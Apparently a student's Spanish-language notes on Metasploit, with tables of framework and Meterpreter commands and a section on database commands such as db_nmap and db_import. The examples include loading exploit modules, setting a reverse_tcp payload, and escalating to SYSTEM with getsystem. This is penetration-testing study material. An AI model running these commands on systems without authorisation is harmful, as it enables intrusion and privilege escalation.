
# Tabla de comandos básicos de Metasploit


| **Comando**                                       | **Uso**                                 | **Ejemplo**                                                                                                              |
| ------------------------------------------------- | --------------------------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| `use [auxiliary/exploit/payload/encoder/evasion]` | Seleccionar un módulo específico        | `msf> use exploit/unix/ftp/vsftpd_234_backdoor`                                                                          |
| `show [exploits/payloads/options/etc.]`           | Ver lista de módulos disponibles        | `msf> show payloads`<br>`msf> show options`                                                                              |
| `set [opción/payload]`                            | Asignar valor a un parámetro específico | `msf> set payload windows/meterpreter/reverse_tcp`<br>`msf> set LHOST 192.168.10.118`<br>`msf> set RHOST 192.168.10.112` |
| `setg [opción/payload]`                           | Asignar valor global a un parámetro     | `msf> setg RHOST 192.168.10.112`                                                                                         |
| `run`                                             | Ejecutar un módulo auxiliar             | `msf> run`                                                                                                               |
| `exploit`                                         | Ejecutar un exploit                     | `msf> exploit`                                                                                                           |
| `back`                                            | Salir del módulo actual y volver        | `msf(ms08_067_netapi)> back`                                                                                             |
| `info`                                            | Ver información detallada de un módulo  | `msf> info exploit/windows/smb/ms08_067_netapi`                                                                          |
| `search`                                          | Buscar un módulo específico             | `msf> search hfs`                                                                                                        |
| `check`                                           | Verificar si el objetivo es vulnerable  | `msf> check`                                                                                                             |
| `sessions`                                        | Listar sesiones activas                 | `msf> sessions [número]`                                                                                                 |


# Comandos básicos de Meterpreter(se verá más adelante)

| **Comando**             | **Uso**                                      | **Ejemplo**               |
| ----------------------- | -------------------------------------------- | ------------------------- |
| `sysinfo`               | Obtener información del sistema comprometido | `meterpreter> sysinfo`    |
| `ifconfig` / `ipconfig` | Listar interfaces de red                     | `meterpreter> ifconfig`   |
| `arp`                   | Ver IPs y MACs conectadas al objetivo        | `meterpreter> arp`        |
| `background`            | Enviar sesión activa a segundo plano         | `meterpreter> background` |
| `shell`                 | Abrir shell de comandos                      | `meterpreter> shell`      |
| `getuid`                | Obtener nombre de usuario actual             | `meterpreter> getuid`     |
| `getsystem`             | Escalar privilegios a SYSTEM                 | `meterpreter> getsystem`  |
| `getpid`                | Obtener el PID del proceso de Meterpreter    | `meterpreter> getpid`     |
| `ps`                    | Listar todos los procesos activos            | `meterpreter> ps`         |



## Gestión de Datos y Bases de Datos en Metasploit Framework

### 1. Importancia de la Persistencia de Datos en Pruebas de Penetración

Durante la ejecución de pruebas de penetración (pentesting), la **persistencia y organización de los datos recolectados** es un aspecto crítico para la eficiencia y la exhaustividad del proceso. La utilización de bases de datos facilita la construcción de una **base de conocimiento (knowledge base)** integral sobre los activos del objetivo, incluyendo _hosts_, servicios y vulnerabilidades identificadas. Esta centralización de la información no solo agiliza las operaciones de búsqueda y recuperación de datos, sino que también mejora la capacidad de respuesta del _framework_.

**Metasploit 5.0 y versiones posteriores** dependen fundamentalmente de servicios de datos, principalmente una base de datos **PostgreSQL** y un servicio web asociado, para almacenar y gestionar la información.

### 2. Verificación y Conectividad de la Base de Datos

Antes de iniciar cualquier operación que requiera persistencia de datos, es esencial verificar el estado de la conexión de Metasploit con su base de datos.

#### 2.1. Comprobación del Estado de la Conexión

- **Comando:** `db_status`
- **Propósito:** Este comando permite determinar si Metasploit Framework está actualmente conectado a una base de datos PostgreSQL o a un servicio de datos web.
- **Ejemplo Práctico:**
    
    ```
    msf5 > db_status
    [*] Connected to remote_data_service: (https://localhost:5443). Connection type: http. Connection name: local-https-data-service.
    ```
    
    (Referencia: Figura 1.19 – Checking database connectivity status)
    - **Interpretación:** El resultado indica una conexión activa a un servicio de datos remoto (`remote_data_service`) a través de HTTPS en el puerto 5443 en `localhost`.

#### 2.2. Conexión a Bases de Datos Alternativas o Servicios de Datos

En escenarios donde se requiere operar con una base de datos o un servicio de datos diferente al predeterminado (ej. una instancia de PostgreSQL remota, o un servicio de datos específico para un proyecto), Metasploit proporciona comandos para establecer estas conexiones.

- **Comando:** `db_connect -h`
- **Propósito:** Muestra la sintaxis y las opciones disponibles para conectar Metasploit a distintas bases de datos o servicios de datos.
- **Ejemplo de Uso y Opciones:** 
  ![[Adjuntos/Pasted image 20250622012107.png]]
    - **Para PostgreSQL:**
        - Conexión básica: `db_connect user:password@host:port/database`
        - Ejemplos: `db_connect user@metasploit3`, `db_connect user:pass@192.168.0.2:1500/metasploit3`
    - **Para HTTP Data Service:**
        - Conexión básica: `db_connect [options] <http[s]>://<host>[:port]`
        - Ejemplos: `db_connect http://localhost:8080`, `db_connect http://my-super-msf-data.service.com`
    - **Opciones Adicionales:** `-l,--list-services`, `-s,--save`, `-n,--name`, `--cert`, `--token`, `--skip-verify`.

### 3. Comandos Esenciales para la Gestión de Datos en Metasploit

Metasploit ofrece un conjunto de comandos _core_ para interactuar con la base de datos, facilitando la importación, exportación, análisis y gestión de la información obtenida durante las fases de un pentesting.

|                 |                                                                                                                                                      |
| --------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Comando**     | **Información de Uso**                                                                                                                               |
| `analyze`       | Este comando permite analizar la información de la base de datos sobre una dirección IP objetivo o un rango de direcciones.                          |
| `db_connect`    | Utilizado para establecer conexiones con bases de datos distintas a la predeterminada de Metasploit.                                                 |
| `db_export`     | Permite exportar el conjunto completo de datos almacenados en la base de datos, útil para generar informes o como entrada para otras herramientas.   |
| `db_nmap`       | Integra la funcionalidad de Nmap para escanear un objetivo y almacenar automáticamente los resultados del escaneo en la base de datos de Metasploit. |
| `db_status`     | Empleado para verificar el estado de la conectividad con la base de datos o el servicio de datos.                                                    |
| `db_disconnect` | Permite desconectarse de una base de datos específica.                                                                                               |
| `db_import`     | Se utiliza para importar resultados de otras herramientas de seguridad (ej. Nessus, Nmap) directamente a la base de datos de Metasploit.             |
|                 |                                                                                                                                                      |
|                 |                                                                                                                                                      |

#### 3.1. Ejemplos Prácticos de Comandos de Base de Datos

- **`db_nmap` (Escaneo e Importación Automática):**
    
    - **Escenario:** Se necesita escanear un rango de IPs y guardar los resultados para análisis posterior.
    - **Comando:** `db_nmap -sV 192.168.1.0/24`
    - **Resultado:** Nmap ejecutará un escaneo de versiones (`-sV`) en el rango especificado, y los _hosts_, puertos y servicios detectados serán automáticamente importados a la base de datos de Metasploit. Esto permite luego consultar estos datos directamente desde Metasploit sin re-escanear o importar manualmente.
- **`db_import` (Integración de Datos Externos):**
    
    - **Escenario:** Se tiene un informe de Nessus (`.nessus` o `.xml`) de un escaneo de vulnerabilidades.
    - **Comando:** `db_import /path/to/nessus_report.nessus`
    - **Resultado:** Metasploit procesará el informe y poblará su base de datos con los _hosts_, puertos, servicios y, crucialmente, las vulnerabilidades identificadas por Nessus, haciendo que esta información sea accesible para el lanzamiento de _exploits_ o para la elaboración de informes.
- **`analyze` (Análisis de Datos):**
    
    - **Escenario:** Después de varios escaneos e importaciones, se desea obtener un resumen de la información recopilada sobre un host específico.
    - **Comando:** `analyze -h 192.168.1.100`
    - **Resultado:** Metasploit mostrará un resumen de los puertos abiertos, servicios, y vulnerabilidades conocidas asociadas a esa dirección IP según los datos en su base.

La integración de una base de datos es una característica poderosa de Metasploit Framework, que transforma el _framework_ de una simple herramienta de explotación a una plataforma integral de gestión de proyectos de pruebas de penetración, mejorando la organización, la eficiencia y la capacidad de análisis de datos.